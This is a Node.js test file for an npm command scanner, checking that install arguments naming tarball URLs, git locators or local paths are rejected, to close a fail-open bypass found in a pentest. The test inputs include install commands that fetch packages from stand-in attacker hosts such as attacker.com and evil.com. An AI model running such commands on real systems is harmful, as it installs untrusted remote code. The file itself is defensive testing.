import { describe, it, mock } from "node:test";
import assert from "node:assert";

describe("npm commandArgumentScanner - non-registry package rejection", async () => {
  // Mock the npmApi to avoid actual network calls
  mock.module("../../../api/npmApi.js", {
    namedExports: {
      resolvePackageVersion: async (name, version) => {
        // Return null to simulate registry lookup failure
        // This mimics the "fail open" scenario from the pentest finding
        return null;
      },
    },
  });

  const { checkChangesFromArgs } = await import("./commandArgumentScanner.js");

  describe("HTTP(S) URL rejection - pentest exploit mitigation", () => {
    it("should reject HTTPS tarball URLs before registry lookup", async () => {
      const args = ["install", "https://attacker.com/malicious.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject HTTP URLs before registry lookup", async () => {
      const args = ["install", "http://evil.com/payload.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject HTTPS URLs even when mixed with valid packages", async () => {
      const args = ["install", "express", "https://attacker.com/backdoor.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });
  });

  describe("Git locator rejection - pentest exploit mitigation", () => {
    it("should reject git:// URLs", async () => {
      const args = ["install", "git://github.com/attacker/malware.git"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject git+https:// URLs", async () => {
      const args = ["install", "git+https://github.com/attacker/malware.git"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject github: shorthand", async () => {
      const args = ["install", "github:attacker/malware"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject gitlab: shorthand", async () => {
      const args = ["install", "gitlab:attacker/malware"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });
  });

  describe("File path rejection - pentest exploit mitigation", () => {
    it("should reject file: protocol", async () => {
      const args = ["install", "file:./malicious.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject relative paths with ./", async () => {
      const args = ["install", "./local-package"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject relative paths with ../", async () => {
      const args = ["install", "../local-package"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should reject absolute paths", async () => {
      const args = ["install", "/tmp/malicious-package"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });
  });

  describe("fail-closed enforcement - core vulnerability mitigation", () => {
    it("should reject non-registry specs before they reach audit", async () => {
      // This test verifies the fix for the core vulnerability:
      // Non-registry specs are now rejected BEFORE creating synthetic identities
      // and BEFORE the audit step that would have allowed them to "fail open"
      const args = ["install", "https://attacker.com/malware.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should prevent synthetic identity creation from URLs", async () => {
      // The pentest finding showed that URLs were parsed as package names
      // and retained when registry lookup failed, bypassing malware checks
      const args = ["install", "https://registry.npmjs.org/fake/-/fake-1.0.0.tgz"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });

    it("should validate before resolvePackageVersion is called", async () => {
      // Ensures validation happens early in the pipeline
      // The pentest showed that failed resolution led to "fail open" behavior
      const args = ["install", "git://github.com/npm/cli.git"];

      await assert.rejects(
        async () => await checkChangesFromArgs(args),
        {
          message: /Non-registry package specifications are not supported/,
        }
      );
    });
  });

  describe("valid registry packages still work", () => {
    it("should allow valid package names", async () => {
      const args = ["install", "express"];

      // Should not throw - validation passes for valid registry packages
      await assert.doesNotReject(async () => await checkChangesFromArgs(args));
    });

    it("should allow scoped packages", async () => {
      const args = ["install", "@scope/package"];

      await assert.doesNotReject(async () => await checkChangesFromArgs(args));
    });

    it("should allow multiple valid packages", async () => {
      const args = ["install", "express", "lodash", "@scope/package"];

      await assert.doesNotReject(async () => await checkChangesFromArgs(args));
    });
  });
});
